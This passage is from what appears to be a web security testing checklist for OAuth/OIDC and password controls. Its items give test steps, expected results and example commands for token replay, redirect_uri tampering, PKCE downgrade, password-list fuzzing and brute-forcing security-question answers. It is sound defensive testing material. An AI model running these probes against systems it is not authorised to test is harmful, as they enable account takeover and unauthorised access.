  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.1.2; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-352, CWE-330; capec: CAPEC-62

- [ ] **WEB-OAUTH-003** Check the state parameter and PKCE in the client  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds clients with no protection against forged callbacks.  
  *Steps:*
  1. Capture the authorization request.
  2. Check for PKCE with S256 or a one-time state value.
  3. Send the callback without state and with a changed state.
  4. Test the consent page in the same way.
  *Example:* `Burp Repeater: GET /callback?code=<code> without the state parameter.`  
  *Expected:* The client uses PKCE or checks state. Callbacks with a missing or changed value are rejected.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHZ-05; asvs: V10.2.1; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-352; capec: CAPEC-62

- [ ] **WEB-OAUTH-004** Check mix-up protection when the client uses several servers  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds clients that confuse responses from different authorization servers.  
  *Steps:*
  1. List the authorization servers of the client.
  2. Check for the iss parameter in the response.
  3. Send a response that names another issuer.
  4. Check that the client compares iss with the server it started the flow with.
  *Example:* `Edit the iss parameter in the callback URL with Burp Repeater.`  
  *Expected:* The client checks the issuer of every response and rejects a response from another server.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.2.2; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-345, CWE-346

- [ ] **WEB-OAUTH-005** Check that the client asks only for needed scopes  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds clients that request more permission than they use.  
  *Steps:*
  1. Capture the authorization request.
  2. List the scope values and other authorization parameters.
  3. Compare them with the features of the client.
  *Example:* `Burp history: filter for /authorize and read the scope parameter.`  
  *Expected:* The client requests only the scopes and parameters its features need.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.2.3; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-272

- [ ] **WEB-OAUTH-006** Check that the resource server checks the audience of access tokens  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds resource servers that accept tokens meant for other services.  
  *Steps:*
  1. Get an access token for service A.
  2. Send it to service B.
  3. Check the aud claim or introspection result in the code.
  *Example:* `curl -H 'Authorization: Bearer <token for A>' https://service-b/api/data`  
  *Expected:* A resource server accepts only tokens meant for itself.  
  *Refs:* owasp_top10: A07:2025; asvs: V10.3.1; cheatsheet: OAuth2_Cheat_Sheet, JSON_Web_Token_Cheat_Sheet; cwe: CWE-345, CWE-863

- [ ] **WEB-OAUTH-007** Check that the resource server enforces scope and claims  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds APIs that ignore scope, sub or authorization_details.  
  *Steps:*
  1. Get a token with a small scope.
  2. Call functions that need a larger scope.
  3. Call data of another subject.
  4. Read the code for checks of scope, sub and authorization_details.
  *Example:* `curl -X DELETE -H 'Authorization: Bearer <read-only token>' https://target/api/items/1`  
  *Expected:* The API decides access from the delegated claims in the token. A small scope cannot do larger actions.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-05; asvs: V10.3.2; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-863, CWE-285

- [ ] **WEB-OAUTH-008** Check that users are identified by issuer and subject  
  *Severity if fail:* Medium | *Type:* Code Review | *Level:* ASVS L2  
  *Objective:* Finds APIs that identify users by claims that can be reused or reassigned.  
  *Steps:*
  1. Read the claim that the API uses to find the user.
  2. Check that it uses iss and sub together.
  3. Check that email or name are not the key.
  *Example:* `grep -rn "claims\[.email.\]\|preferred_username" src/`  
  *Expected:* The API identifies users by iss plus sub, not by changeable claims.  
  *Refs:* asvs: V10.3.3; cheatsheet: OAuth2_Cheat_Sheet, Authentication_Cheat_Sheet; cwe: CWE-290, CWE-639

- [ ] **WEB-OAUTH-009** Check that the resource server checks authentication strength  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds APIs that need strong or recent login but ignore acr, amr and auth_time.  
  *Steps:*
  1. List functions that need strong or recent login.
  2. Call them with a token from a weak login.
  3. Check the acr, amr and auth_time checks in the code.
  *Example:* `jwt_tool <access token> to read acr and amr; call the sensitive API with it.`  
  *Expected:* The API checks the strength, method and age of the login before it allows the function.  
  *Refs:* asvs: V10.3.4; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-308, CWE-304

- [ ] **WEB-OAUTH-010** Check sender-constrained tokens  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds bearer tokens that anyone can replay when stolen.  
  *Steps:*
  1. Check if access tokens are bound by DPoP or mTLS.
  2. Send a valid token from another client without the proof.
  3. Check that the server rejects it.
  *Example:* `curl -H 'Authorization: DPoP <token>' https://target/api/me without the DPoP header.`  
  *Expected:* A token works only with the proof of the client that it is bound to.  
  *Refs:* asvs: V10.3.5, V10.4.14; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-294, CWE-522

- [ ] **WEB-OAUTH-011** Check redirect URI validation  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds authorization servers that send codes or tokens to unregistered URIs.  
  *Steps:*
  1. Start the flow and pause at the authorization request.
  2. Change redirect_uri to a different host, path and port.
  3. Try a prefix, subdomain and encoding change of the registered URI.
  4. Check that http URIs are not allowed.
  *Example:* `ZAP: change redirect_uri=https%3A%2F%2Fclient.example.com%2F to a value outside the registered list.`  
  *Expected:* The server compares redirect_uri with the registered list by exact string. It shows an error and does not redirect.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-05; asvs: V10.4.1; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-601

- [ ] **WEB-OAUTH-012** Check that authorization codes work once and live shortly  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds codes that can be replayed or that live too long.  
  *Steps:*
  1. Complete a flow and save the code.
  2. Exchange the code twice.
  3. Check that the second try fails and that issued tokens are revoked.
  4. Exchange a code after 10 minutes.
  5. Try a code with another client_id, user or redirect_uri.
  *Example:* `curl -X POST https://as.example.com/oauth/token -d grant_type=authorization_code -d code=<code> -d client_id=c -d redirect_uri=<uri> (twice)`  
  *Expected:* A code works once, lives 10 minutes or less, and is bound to client, user and redirect URI. Reuse revokes the tokens.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.4.2, V10.4.3; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-294, CWE-324; capec: CAPEC-60

- [ ] **WEB-OAUTH-013** Check which grant types a client may use  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds allowed implicit, password or other grants that the client does not need.  
  *Steps:*
  1. Read the client registration.
  2. Send token requests with other grant types.
  3. Look for response_type=token in the authorization request.
  4. Check that implicit and password grants are off.
  *Example:* `curl -X POST https://as.example.com/oauth/token -d grant_type=password -d username=t -d password=t -d client_id=c`  
  *Expected:* Each client can use only the grants it needs. Implicit and password grants are not used.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.4.4; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-287

- [ ] **WEB-OAUTH-014** Check refresh token replay protection  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds refresh tokens of public clients that can be replayed.  
  *Steps:*
  1. Get a refresh token.
  2. Use it and save the new refresh token.
  3. Use the old token again.
  4. Check that the server revokes the token family or uses DPoP or mTLS.
  *Example:* `curl -X POST https://as.example.com/token -d grant_type=refresh_token -d refresh_token=<old> -d client_id=c (twice)`  
  *Expected:* A refresh token is sender-bound or rotated. Reuse of an old token invalidates the whole family.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.4.5; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-294; capec: CAPEC-60

- [ ] **WEB-OAUTH-015** Check that PKCE is required and cannot be downgraded  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds servers that accept codes without a valid code challenge.  
  *Steps:*
  1. Send the authorization request without code_challenge.
  2. Send it with an empty value and with method plain.
  3. Send the token request without code_verifier and with a wrong one.
  4. Use a valid verifier from another code.
  *Example:* `ZAP: remove code_challenge and code_challenge_method from GET /authorize.`  
  *Expected:* The server requires S256 PKCE and checks the verifier. All downgrade forms fail.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.4.6; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-303, CWE-345

- [ ] **WEB-OAUTH-016** Check dynamic client registration controls  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds open registration that allows malicious clients.  
  *Steps:*
  1. Find the registration endpoint in the metadata.
  2. Register a client without authentication in a test environment.
  3. Check the validation of redirect URIs and metadata.
  4. Check the consent warning for unknown clients.
  *Example:* `curl https://as.example.com/.well-known/openid-configuration | jq .registration_endpoint`  
  *Expected:* Open registration validates client data, asks the user for consent and warns about untrusted clients.  
  *Refs:* asvs: V10.4.7; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-287, CWE-601

- [ ] **WEB-OAUTH-017** Check refresh token lifetime and token expiry  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds tokens that never expire.  
  *Steps:*
  1. Read the lifetime of access tokens.
  2. Use refresh tokens over time and with sliding expiry.
  3. Check for an absolute end of life.
  4. Use an access token after expiry.
  *Example:* `curl -H 'Authorization: Bearer <token>' https://target/userinfo after 5, 10 and 30 minutes.`  
  *Expected:* Access tokens are short lived. Refresh tokens have an absolute expiry, also with sliding expiry.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.4.8; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-324, CWE-287

- [ ] **WEB-OAUTH-018** Check that users can revoke tokens and consents  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds no way to stop a malicious client or stolen token.  
  *Steps:*
  1. Open the authorization server account page.
  2. List granted clients and tokens.
  3. Revoke a refresh token.
  4. Use the revoked token.
  *Example:* `POST /oauth/revoke token=<refresh token> then call /token with it.`  
  *Expected:* The user can review, change and revoke consents, refresh tokens and reference access tokens. Revoked tokens fail.  
  *Refs:* asvs: V10.4.9, V10.7.3; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-287

- [ ] **WEB-OAUTH-019** Check client authentication at the back channel  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds token, PAR and revocation endpoints that work without client authentication.  
  *Steps:*
  1. Send a token request for a confidential client without credentials.
  2. Do the same for the PAR and revocation endpoints.
  3. Check that the client secret is not in client code.
  *Example:* `curl -X POST https://as.example.com/oauth/token -d grant_type=client_credentials -d client_id=c`  
  *Expected:* Confidential clients must authenticate at every back-channel endpoint.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.4.10; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-306, CWE-287

- [ ] **WEB-OAUTH-020** Check scopes assigned to each client  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds clients with scopes they do not need.  
  *Steps:*
  1. List registered clients and their scopes.
  2. Compare them with client features.
  3. Request a scope that is not assigned.
  *Example:* `curl 'https://as.example.com/authorize?client_id=c&scope=admin&response_type=code'`  
  *Expected:* A client can get only the scopes assigned to it.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.4.11; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-272, CWE-269

- [ ] **WEB-OAUTH-021** Check allowed response_mode values  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds clients that can use a response mode they do not need.  
  *Steps:*
  1. Read the registration of each client.
  2. Send a request with a different response_mode.
  3. Check for PAR or JAR use.
  *Example:* `GET /authorize?...&response_mode=fragment vs web_message.`  
  *Expected:* The server accepts only the response modes registered for the client.  
  *Refs:* asvs: V10.4.12; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-345

- [ ] **WEB-OAUTH-022** Check PAR and protected authorization details  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds requests whose parameters a user can change.  
  *Steps:*
  1. Check that the code flow uses PAR for L3 systems.
  2. Change authorization_details in the browser request.
  3. Check that the server takes the value from the client back end.
  *Example:* `curl -X POST https://as.example.com/par -u client:secret -d 'response_type=code&client_id=c&...'`  
  *Expected:* The code grant is used with PAR. Users cannot change authorization_details.  
  *Refs:* asvs: V10.4.13, V10.4.15; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-345

- [ ] **WEB-OAUTH-023** Check strong client authentication  
  *Severity if fail:* Medium | *Type:* Config Review | *Level:* ASVS L3  
  *Objective:* Finds clients that use shared secrets where stronger methods are needed.  
  *Steps:*
  1. Read the client authentication method.
  2. Check for tls_client_auth, self_signed_tls_client_auth or private_key_jwt.
  3. Check that the client is confidential.
  *Example:* `curl https://as.example.com/.well-known/openid-configuration | jq .token_endpoint_auth_methods_supported`  
  *Expected:* Clients use public-key based authentication that resists replay.  
  *Refs:* asvs: V10.4.16; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-287

- [ ] **WEB-OAUTH-024** Check the ID token nonce  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds clients that accept replayed ID tokens.  
  *Steps:*
  1. Start a login and note the nonce.
  2. Replay an old ID token in a new login.
  3. Check that the client compares the nonce claim.
  *Example:* `jwt_tool <ID token> to read nonce; replay it at /callback.`  
  *Expected:* The client rejects an ID token whose nonce does not match the request.  
  *Refs:* asvs: V10.5.1; cheatsheet: Authentication_Cheat_Sheet, OAuth2_Cheat_Sheet; cwe: CWE-294; capec: CAPEC-60

- [ ] **WEB-OAUTH-025** Check user identity and audience in ID tokens  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds clients that identify users by reusable claims or accept tokens for other clients.  
  *Steps:*
  1. Read the sub, iss and aud claims.
  2. Check that the account key is iss plus sub.
  3. Send an ID token with another aud.
  4. Check that aud equals the client_id.
  *Example:* `jwt_tool <ID token> ; replay a token from client B at client A.`  
  *Expected:* The client uses sub with iss to find users. It rejects tokens whose aud is not its own client_id.  
  *Refs:* owasp_top10: A07:2025; asvs: V10.5.2, V10.5.4; cheatsheet: Authentication_Cheat_Sheet, OAuth2_Cheat_Sheet; cwe: CWE-290, CWE-345

- [ ] **WEB-OAUTH-026** Check authorization server metadata handling  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds clients that trust metadata with another issuer.  
  *Steps:*
  1. Read the pre-configured issuer URL.
  2. Serve test metadata with another issuer URL.
  3. Check that the client rejects it.
  *Example:* `Point the discovery URL to a test server with a different issuer value.`  
  *Expected:* The client rejects metadata when the issuer is not exactly the configured one.  
  *Refs:* asvs: V10.5.3; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-346, CWE-345

- [ ] **WEB-OAUTH-027** Check OIDC back-channel logout token handling  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds logout flows that allow forced logout or token confusion.  
  *Steps:*
  1. Send a logout token with wrong typ.
  2. Send one with a nonce claim, and one without the events claim.
  3. Check expiry and signature checks.
  *Example:* `curl -X POST https://client.example.com/backchannel-logout -d logout_token=<test token>`  
  *Expected:* The client accepts only logout+jwt tokens with the correct event claim, no nonce and a short life.  
  *Refs:* asvs: V10.5.5; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-345, CWE-347

- [ ] **WEB-OAUTH-028** Check the response types of the OpenID Provider  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds providers that allow implicit flow responses.  
  *Steps:*
  1. Read the response_types_supported metadata.
  2. Request response_type=token and id_token token.
  3. Check that only code, ciba, id_token and id_token code work.
  *Example:* `curl https://op.example.com/.well-known/openid-configuration | jq .response_types_supported`  
  *Expected:* The provider does not allow response types that return access tokens in the front channel.  
  *Refs:* asvs: V10.6.1; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-522

- [ ] **WEB-OAUTH-029** Check forced logout protection at the OpenID Provider  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds logout endpoints that end sessions without user consent.  
  *Steps:*
  1. Open the logout URL from another site with no id_token_hint.
  2. Check for a confirmation page.
  3. Check the checks of id_token_hint and the redirect URI.
  *Example:* `Open https://op.example.com/logout from a cross-site page.`  
  *Expected:* The provider asks the user to confirm or validates the logout request parameters.  
  *Refs:* asvs: V10.6.2; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-352

- [ ] **WEB-OAUTH-030** Check user consent and the information shown  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds missing or unclear consent for authorization requests.  
  *Steps:*
  1. Start a flow with a new client.
  2. Check that consent is asked for each request, always when the client is unknown.
  3. Check that the page names the client, scopes and lifetime.
  4. Check the consent page for CSRF and framing.
  *Example:* `curl -I https://as.example.com/consent | grep -i 'x-frame-options\|frame-ancestors'`  
  *Expected:* The user gives clear consent for each request. The page cannot be framed, and a changed state is rejected.  
  *Refs:* wstg: WSTG-ATHZ-05; asvs: V10.7.1, V10.7.2; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-352, CWE-1021

- [ ] **WEB-OAUTH-031** Check the types of grant in use and leaks of OAuth credentials  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds deprecated grants and tokens or codes exposed in URLs and Referer.  
  *Steps:*
  1. Find the grant type of each flow from the token and authorize requests.
  2. Look for tokens or codes in URLs.
  3. Look at the Referer header sent to other sites.
  4. Check for the Referrer-Policy header.
  *Example:* `ZAP history: search the Referer header for code= and access_token=.`  
  *Expected:* Public clients use code with PKCE. Secrets are not in URLs. Referrer-Policy limits leaks.  
  *Refs:* wstg: WSTG-ATHZ-05; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-598, CWE-200

- [ ] **WEB-OAUTH-032** Check for exposed client secrets and token storage in the client  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds client secrets in public clients and tokens kept in local storage.  
  *Steps:*
  1. Search the client code for client_secret.
  2. Look at the authorization traffic for secrets.
  3. Look at where tokens are stored.
  4. For implicit flows, check for access token injection.
  *Example:* `DevTools Debugger: Ctrl+Shift+F for client_secret; Application tab for tokens.`  
  *Expected:* Public clients have no secret. Tokens are not stored in local storage. Injected tokens are rejected.  
  *Refs:* wstg: WSTG-ATHZ-05; cheatsheet: OAuth2_Cheat_Sheet; cwe: CWE-798, CWE-922


## PWD

- [ ] **WEB-PWD-001** Check the minimum password length  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds weak minimum length rules that allow short passwords.  
  *Steps:*
  1. Register a new account with passwords of 4, 7, 8, 14 and 15 characters.
  2. Change the password of a test account to the same lengths.
  3. Look at the rule in the documentation. Compare it with what the server accepts.
  4. Send the short password directly to the API and skip client-side checks.
  *Example:* `curl -s -X POST https://target/api/register -H 'Content-Type: application/json' -d '{"email":"t1@test.example","password":"Ab1!xyz"}' -i`  
  *Expected:* The server rejects passwords shorter than 8 characters. The application sets 15 characters where MFA is not used. Client-side checks are not the only control.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-07; asvs: V6.2.1; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-521

- [ ] **WEB-PWD-002** Check that long passwords and passphrases are accepted  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds a low maximum password length that blocks passphrases.  
  *Steps:*
  1. Set a password of 64 characters, then 128 characters.
  2. Log in with each password.
  3. Use spaces and Unicode characters in a long password.
  4. Look for silent cut-off: change only the last character and log in.
  *Example:* `python3 -c "print('a'*63+'X')" | xargs -I{} curl -s -d 'password={}&new=1' https://target/change`  
  *Expected:* Passwords of at least 64 characters are accepted and fully used. The application sets a sane upper limit and shows an error if it is exceeded.  
  *Refs:* wstg: WSTG-ATHN-07; asvs: V6.2.9; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-521

- [ ] **WEB-PWD-003** Check that the password is used exactly as the user typed it  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds truncation, case change or other changes to the password before it is checked.  
  *Steps:*
  1. Set a password with upper-case letters and 80 characters.
  2. Log in with the same password in lower case.
  3. Log in with only the first 72 characters and with only the first 64 characters.
  4. Log in with the first 8 characters.
  *Example:* `Burp Repeater: login with password = first 72 chars of the set value; then with the value in lower case.`  
  *Expected:* Only the exact password is accepted. The application does not truncate or change the case of the password.  
  *Refs:* wstg: WSTG-ATHN-04; asvs: V6.2.8; cheatsheet: Password_Storage_Cheat_Sheet, Authentication_Cheat_Sheet; cwe: CWE-303, CWE-521

- [ ] **WEB-PWD-004** Test the change password function  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds password change that works without the current password or the right user.  
  *Steps:*
  1. Log in and change the password with the correct current password.
  2. Send the change request without the current password.
  3. Send it with a wrong current password.
  4. Change the user or ID parameter to another account.
  5. Make sure the old password no longer works.
  *Example:* `curl -i -b 'session=<id>' -d 'new=Passw0rd-long-and-new&confirm=Passw0rd-long-and-new' https://target/account/password`  
  *Expected:* The user can change the password. The server needs the current and the new password and acts only on the session user.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-09; asvs: V6.2.2, V6.2.3; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-620, CWE-639

- [ ] **WEB-PWD-005** Check new passwords against a list of common passwords  
  *Severity if fail:* Medium | *Type:* Automated | *Level:* ASVS L1  
  *Objective:* Finds acceptance of the most common passwords.  
  *Steps:*
  1. Try to register with 10 passwords from the top 3000 list that meet the length rule.
  2. Try the same passwords on the change function.
  3. Try Password1, 123456789012345 and qwertyuiopasdfg.
  *Example:* `ffuf -w 10k-most-common.txt -X POST -d '{"email":"u@test.example","password":"FUZZ"}' -H 'Content-Type: application/json' -u https://target/api/register -mc 200,201`  
  *Expected:* The application rejects every password from the top 3000 list at registration and at change.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-07; asvs: V6.2.4; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-521, CWE-1391

- [ ] **WEB-PWD-006** Check new passwords against breached passwords  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds missing checks against known leaked passwords.  
  *Steps:*
  1. Pick a password that is in Pwned Passwords but meets the length rule.
  2. Try to register with it. Then try to change a password to it.
  3. Read the code or documentation for the data source.
  *Example:* `Check candidate hash prefix: curl https://api.pwnedpasswords.com/range/21BD1 ; then POST the plain password to /register.`  
  *Expected:* The application rejects breached passwords at registration and at password change.  
  *Refs:* owasp_top10: A07:2025; asvs: V6.2.12; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-521, CWE-1391

- [ ] **WEB-PWD-007** Check the list of context-specific words for passwords  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds missing documentation or missing use of words such as company and product names.  
  *Steps:*
  1. Get the documented list of context-specific words.
  2. Make sure it holds the organization, product, project and department names.
  3. Try to set passwords built from these words.
  4. Make sure the application rejects them.
  *Example:* `Registration with password 'AcmeWidgetPortal2024!' and the documented words in Burp Repeater.`  
  *Expected:* The list is documented. The application rejects passwords that are built from these words.  
  *Refs:* asvs: V6.1.2, V6.2.11; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-521

- [ ] **WEB-PWD-008** Check that no composition rules limit password characters  
  *Severity if fail:* Info | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds rules that force or ban character types and so reduce password quality.  
  *Steps:*
  1. Set a password of only lower-case letters and 20 characters.
  2. Set a password with spaces, Unicode and symbols.
  3. Read the registration help text for composition rules.
  *Example:* `POST /register password='correct horse battery staple' (no digits or symbols); then password with emoji and tab.`  
  *Expected:* Passwords of any composition are accepted if they meet the length rule. No minimum count of any character type is required.  
  *Refs:* wstg: WSTG-ATHN-07; asvs: V6.2.5; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-521

- [ ] **WEB-PWD-009** Check the password field masking and paste support  
  *Severity if fail:* Info | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds password fields that show the text or block paste and password managers.  
  *Steps:*
  1. Look at the HTML of the login, registration and change forms.
  2. Make sure the field is type=password.
  3. Paste a value into the password and MFA fields.
  4. Use a browser or external password manager to fill the form.
  *Example:* `DevTools console: [...document.querySelectorAll('input')].map(i=>[i.name,i.type,i.onpaste]) `  
  *Expected:* Password fields use type=password. Paste and password managers work. The user can show the value on purpose.  
  *Refs:* asvs: V6.2.6, V6.2.7; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-549

- [ ] **WEB-PWD-010** Check that the application does not force password rotation  
  *Severity if fail:* Info | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Finds forced periodic password change, which weakens passwords.  
  *Steps:*
  1. Read the password policy and the application settings.
  2. Look for an expiry period in the user store.
  3. Log in with an account that has an old password.
  *Example:* `grep -rn 'password.*expire\|maxAge\|rotation' config/ ; ldapsearch for pwdMaxAge on the user store.`  
  *Expected:* A password stays valid until it is found compromised or the user changes it. No periodic rotation is required.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-07; asvs: V6.2.10; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-262, CWE-263

- [ ] **WEB-PWD-011** Check that the password policy is the same everywhere  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds weaker password rules in reset, change or admin flows.  
  *Steps:*
  1. Set a weak password at registration and note the error.
  2. Try the same password on change, reset and admin create-user.
  3. Try to reuse the last password and change the password five times in a row.
  4. Try to use the user name in the password.
  *Example:* `Run the same short password with Burp Intruder against /register, /account/password and /reset/confirm.`  
  *Expected:* Registration, change, reset and admin flows apply the same rules. The server enforces them.  
  *Refs:* wstg: WSTG-ATHN-07, WSTG-ATHN-09; cheatsheet: Authentication_Cheat_Sheet, Forgot_Password_Cheat_Sheet; cwe: CWE-521

- [ ] **WEB-PWD-012** Check how passwords are stored  
  *Severity if fail:* High | *Type:* Code Review  
  *Objective:* Finds plain text, reversible or fast-hash storage of passwords.  
  *Steps:*
  1. Read the code or database for the password column.
  2. Make sure it holds a hash made with Argon2id, scrypt, bcrypt or PBKDF2.
  3. Check the cost settings against the cheat sheet minimum.
  4. Make sure each hash has its own random salt.
  5. Look for logs and backups with plain passwords.
  *Example:* `SELECT password FROM users LIMIT 3; hashid '<hash>'; grep -rn 'md5(\|sha1(\|bcrypt\|argon2' src/`  
  *Expected:* Passwords are hashed with a slow, salted algorithm at the recommended cost. No plain text or reversible form exists.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-04; cheatsheet: Password_Storage_Cheat_Sheet; cwe: CWE-256, CWE-257, CWE-916, CWE-328, CWE-261; capec: CAPEC-55

- [ ] **WEB-PWD-013** Check the safe comparison of password hashes  
  *Severity if fail:* Low | *Type:* Code Review  
  *Objective:* Finds timing leaks and type confusion in the password check.  
  *Steps:*
  1. Read the code that compares the hash.
  2. Make sure it uses a library function with constant time.
  3. Make sure the function has an input length limit and fixed types.
  4. Measure response time for users with a correct and a wrong first character.
  *Example:* `grep -rn "hash_equals\|timingSafeEqual\|compare_digest\|ConstantTimeCompare" src/ ; ab or Burp Intruder timing for 200 requests.`  
  *Expected:* The code uses a constant-time function with fixed types and length limits.  
  *Refs:* cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-208, CWE-1287

- [ ] **WEB-PWD-014** Check that security questions and hints are absent  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds knowledge-based recovery that attackers can guess or look up.  
  *Steps:*
  1. Open registration, profile and password recovery pages.
  2. Look for security questions, hints and secret answers.
  3. Look at the account recovery API for question fields.
  *Example:* `grep -rni 'security question\|secret question\|maiden' templates/ ; Burp search for 'question' in proxy history.`  
  *Expected:* No password hints or security questions exist for authentication or recovery.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-08; asvs: V6.4.2; cheatsheet: Choosing_and_Using_Security_Questions_Cheat_Sheet, Forgot_Password_Cheat_Sheet, Authentication_Cheat_Sheet; cwe: CWE-640; capec: CAPEC-50

- [ ] **WEB-PWD-015** Test weak security questions if they still exist  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds guessable questions, self-written questions and answers without brute-force limits.  
  *Steps:*
  1. List all pre-set questions. Mark questions with public, short-list or guessable answers.
  2. Create a custom question such as What is 1+1.
  3. Send 100 wrong answers and look for a lockout.
  4. Check how many questions the recovery needs.
  *Example:* `Burp Intruder with a first-name wordlist on the answer parameter of POST /recover/question.`  
  *Expected:* No question has a guessable answer. Users cannot write their own question. Wrong answers trigger a lockout or delay. Remove the function if possible.  
  *Refs:* wstg: WSTG-ATHN-08; cheatsheet: Choosing_and_Using_Security_Questions_Cheat_Sheet; cwe: CWE-640, CWE-307

- [ ] **WEB-PWD-016** Check initial passwords and activation codes  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds predictable, reusable or long-lived system-generated initial secrets.  
  *Steps:*
  1. Create five accounts quickly and collect the initial passwords or codes.
  2. Look for patterns, shared strings, hashes of user data or time links.
  3. Use a code twice and after its lifetime.
  4. Check if the user must change the initial password.
  5. Check that the initial password follows the policy.
